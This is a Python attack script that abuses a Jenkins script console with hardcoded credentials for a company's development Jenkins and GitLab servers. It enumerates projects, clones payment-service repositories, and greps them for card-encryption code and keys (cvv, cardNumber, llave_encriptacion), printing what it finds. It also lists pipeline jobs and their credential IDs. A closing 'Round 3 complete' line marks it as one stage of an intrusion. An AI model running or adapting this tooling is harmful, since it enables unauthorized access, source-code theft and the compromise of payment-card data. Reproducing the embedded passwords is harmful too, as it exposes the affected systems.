import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=240).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK 1: GitLab API enumerate projects + user ──────────────
script1 = (
    'import groovy.json.JsonSlurper\n'
    'def base = "https://gitlab.dev.claroshop.com"\n'
    'def creds = [["jenkins","e6LBqIkOI\\$PR1XX2oia"],["jenkins_legacy","JenkisLegasy25"]]\n'
    'def paths = ["/api/v4/version","/api/v4/user","/api/v4/projects?per_page=20&simple=true","/api/v4/projects?per_page=20","/api/v4/groups","/api/v4/namespaces"]\n'
    'creds.each { cred ->\n'
    '    def enc = (cred[0]+":"+cred[1]).bytes.encodeBase64().toString()\n'
    '    paths.each { path ->\n'
    '        try {\n'
    '            def conn = new URL(base+path).openConnection()\n'
    '            conn.connectTimeout=8000; conn.readTimeout=15000\n'
    '            conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '            def code=conn.responseCode\n'
    '            def body=code<400?conn.inputStream.text:conn.errorStream?.text?:""\n'
    '            println "${cred[0]} ${path} [${code}]: ${body.take(300)}"\n'
    '        } catch(e){println "${cred[0]} ${path} FAIL:${e.message?.take(80)}"}\n'
    '    }\n'
    '}\n'
)
jenkins_exec(script1, "GITLAB API ENUMERATE")
time.sleep(1)

# ── TASK 2: Git clone caja repos via Jenkins bash ─────────────
# Password: e6LBqIkOI$PR1XX2oia - $ needs escaping in bash URL
script2 = (
    'def GITPASS = "e6LBqIkOI\\$PR1XX2oia"\n'
    'def GITBASE = "http://jenkins:" + GITPASS + "@gitlab.dev.claroshop.com"\n'
    'def repos = ["claroshop/caja-pagos-api","claroshop/caja-api","claroshop/claropay-api","claroshop/axii-claroshop","claroshop/ms-cart"]\n'
    'repos.each { repo ->\n'
    '    def outDir = "/tmp/gc_" + repo.replace("/","_")\n'
    '    def cmd = "git clone --depth=1 " + GITBASE + "/" + repo + ".git " + outDir + " 2>&1"\n'
    '    def r = ["bash","-c",cmd].execute()\n'
    '    r.waitForOrKill(30000)\n'
    '    def out = r.text\n'
    '    println "CLONE ${repo}: ${out.take(150)}"\n'
    '    def f = new File(outDir)\n'
    '    if (f.exists()) {\n'
    '        println "  FILES: " + f.listFiles()?.collect{it.name}?.join(", ")\n'
    '        def r2 = ["bash","-c","find ${outDir} -name \'*.php\' 2>/dev/null | wc -l"].execute().text.trim()\n'
    '        println "  PHP count: ${r2}"\n'
    '    }\n'
    '}\n'
)
jenkins_exec(script2, "GIT CLONE CAJA REPOS")
time.sleep(2)

# ── TASK 3: Search cloned repos for encrypt code ─────────────
script3 = (
    'def cloneDirs = ["/tmp/gc_claroshop_caja-pagos-api","/tmp/gc_claroshop_caja-api","/tmp/gc_claroshop_claropay-api","/tmp/gc_claroshop_ms-cart"]\n'
    'def keywords = ["encript","llave_encriptacion","datostarjeta","mcrypt","openssl_encrypt","tarjeta_cifrada","CardData","cardNumber","cvv","cipher"]\n'
    'cloneDirs.each { dir ->\n'
    '    def f = new File(dir)\n'
    '    if (f.exists()) {\n'
    '        println "\\n=== DIR: ${dir} ==="\n'
    '        def ls = ["bash","-c","ls ${dir} 2>/dev/null"].execute().text\n'
    '        println ls.take(200)\n'
    '        keywords.each { kw ->\n'
    '            def r = ["bash","-c","grep -rl \'${kw}\' ${dir} 2>/dev/null | head -5"].execute().text.trim()\n'
    '            if (r) println "  KW=${kw}: ${r}"\n'
    '        }\n'
    '        // Cat any found file\n'
    '        def found = ["bash","-c","grep -rl \'encript\\\\|llave\' ${dir} 2>/dev/null | head -1"].execute().text.trim()\n'
    '        if (found) {\n'
    '            def content = ["bash","-c","cat \'${found}\' 2>/dev/null | head -200"].execute().text\n'
    '            println "\\n  --- ENCRYPT FILE: ${found} ---"\n'
    '            println content\n'
    '        }\n'
    '    }\n'
    '}\n'
    'println "\\n=== /tmp listing ==="\n'
    'println ["bash","-c","ls /tmp/ 2>/dev/null"].execute().text\n'
)
jenkins_exec(script3, "SEARCH CLONED REPOS FOR ENCRYPT CODE")
time.sleep(1)

# ── TASK 4: GitLab search API for caja/pagos repos ────────────
script4 = (
    'def base = "https://gitlab.dev.claroshop.com"\n'
    'def user = "jenkins"; def pass_ = "e6LBqIkOI\\$PR1XX2oia"\n'
    'def enc = (user+":"+pass_).bytes.encodeBase64().toString()\n'
    'def searches = ["caja","pagos","encrypt","tarjeta","claropay","axii","carrito","auth"]\n'
    'searches.each { q ->\n'
    '    try {\n'
    '        def url = new URL(base+"/api/v4/projects?search="+q+"&per_page=10&simple=true")\n'
    '        def conn = url.openConnection()\n'
    '        conn.connectTimeout=8000; conn.readTimeout=10000\n'
    '        conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '        def code=conn.responseCode\n'
    '        def body=code<400?conn.inputStream.text:conn.errorStream?.text?:""\n'
    '        println "SEARCH ${q} [${code}]: ${body.take(500)}"\n'
    '    } catch(e){println "SEARCH ${q} FAIL:${e.message?.take(80)}"}\n'
    '}\n'
    '// Try namespaces\n'
    'try {\n'
    '    def url = new URL(base+"/api/v4/namespaces?per_page=50")\n'
    '    def conn = url.openConnection()\n'
    '    conn.connectTimeout=8000; conn.readTimeout=10000\n'
    '    conn.setRequestProperty("Authorization","Basic "+enc)\n'
    '    def code=conn.responseCode\n'
    '    def body=code<400?conn.inputStream.text:conn.errorStream?.text?:""\n'
    '    println "NAMESPACES [${code}]: ${body.take(1000)}"\n'
    '} catch(e){println "NAMESPACES FAIL"}\n'
)
jenkins_exec(script4, "GITLAB SEARCH + NAMESPACES")
time.sleep(1)

# ── TASK 5: Find encrypt code in existing caja workspaces ──────
script5 = (
    'def cajaJobDirs = [\n'
    '    "/var/jenkins_home/jobs/cs_legacy_front/cs_legacy_pipe_build_caja-api",\n'
    '    "/var/jenkins_home/jobs/cs_legacy_front/cs_legacy_pipe_build_caja-front"\n'
    ']\n'
    'cajaJobDirs.each { jobDir ->\n'
    '    println "\\n=== JOB DIR: ${jobDir} ==="\n'
    '    def f = new File(jobDir)\n'
    '    if (f.exists()) {\n'
    '        def ls = ["bash","-c","find ${jobDir} -type d | head -20"].execute().text\n'
    '        println ls\n'
    '        \n'
    '        // Find workspace\n'
    '        def ws = ["bash","-c","find ${jobDir} -name workspace -type d 2>/dev/null | head -5"].execute().text.trim()\n'
    '        println "WORKSPACE: ${ws}"\n'
    '        \n'
    '        if (ws) {\n'
    '            def wsDirs = ws.split("\\n")\n'
    '            wsDirs.each { wsDir ->\n'
    '                println "\\n  --- Searching in ${wsDir} ---"\n'
    '                def phpFiles = ["bash","-c","find ${wsDir} -name \'*.php\' 2>/dev/null | wc -l"].execute().text.trim()\n'
    '                println "  PHP files: ${phpFiles}"\n'
    '                def encrFiles = ["bash","-c","grep -rl \'encript\\\\|llave\\\\|mcrypt\\\\|tarjeta\\\\|CardData\' ${wsDir} 2>/dev/null | head -10"].execute().text\n'
    '                println "  ENCRYPT: ${encrFiles}"\n'
    '                if (encrFiles.trim()) {\n'
    '                    def firstFile = encrFiles.trim().split("\\n")[0]\n'
    '                    def content = ["bash","-c","cat \'${firstFile}\' 2>/dev/null | head -200"].execute().text\n'
    '                    println "  --- ${firstFile} ---"\n'
    '                    println content\n'
    '                }\n'
    '            }\n'
    '        }\n'
    '    } else {\n'
    '        println "DIR NOT FOUND"\n'
    '    }\n'
    '}\n'
    '\n'
    '// Also try to find the actual pipeline job workspace\n'
    'def r = ["bash","-c","find /var/jenkins_home/jobs -type d -name workspace 2>/dev/null | head -20"].execute().text\n'
    'println "\\n=== ALL WORKSPACE DIRS ==="\n'
    'println r\n'
)
jenkins_exec(script5, "CAJA WORKSPACE ENCRYPT SEARCH")
time.sleep(1)

# ── TASK 6: List Jenkinsfile from a caja pipeline to find repo URL
script6 = (
    'import jenkins.model.Jenkins\n'
    'import org.jenkinsci.plugins.workflow.job.WorkflowJob\n'
    '\n'
    'def jenkins = Jenkins.instance\n'
    'def cajaJobs = jenkins.allItems.findAll { it.fullName.contains("caja") || it.fullName.contains("pagos") || it.fullName.contains("claropay") }\n'
    'println "=== CAJA/PAGOS/CLAROPAY JOBS ==="\n'
    'cajaJobs.each { job ->\n'
    '    println "\\nJOB: ${job.fullName}"\n'
    '    try {\n'
    '        // Get SCM URL\n'
    '        def scm = job.scm\n'
    '        if (scm) println "  SCM: ${scm.class.simpleName}"\n'
    '        if (scm?.respondsTo("getUserRemoteConfigs")) {\n'
    '            scm.userRemoteConfigs.each { r -> println "  URL: ${r.url} | Cred: ${r.credentialsId}" }\n'
    '        }\n'
    '    } catch(e) {}\n'
    '    // Read Jenkinsfile definition\n'
    '    try {\n'
    '        def definition = job.definition\n'
    '        println "  DEF_TYPE: ${definition?.class?.simpleName}"\n'
    '        if (definition?.respondsTo("getSCM")) {\n'
    '            def defScm = definition.getSCM()\n'
    '            if (defScm?.respondsTo("getUserRemoteConfigs")) {\n'
    '                defScm.userRemoteConfigs.each { r -> println "  JENKINSFILE_URL: ${r.url}" }\n'
    '            }\n'
    '        }\n'
    '        if (definition?.respondsTo("getScriptPath")) println "  SCRIPT: ${definition.getScriptPath()}"\n'
    '    } catch(e2) { println "  ERR: ${e2.message?.take(80)}" }\n'
    '    // Last build workspace\n'
    '    try {\n'
    '        def lastBuild = job.lastSuccessfulBuild\n'
    '        if (lastBuild) println "  LAST_BUILD: #${lastBuild.number} at ${new Date(lastBuild.timeInMillis)}"\n'
    '    } catch(e3) {}\n'
    '}\n'
)
jenkins_exec(script6, "CAJA JOB DETAILS + REPO URLS")
time.sleep(1)

print("\n\n[DONE] Round 3 complete.")
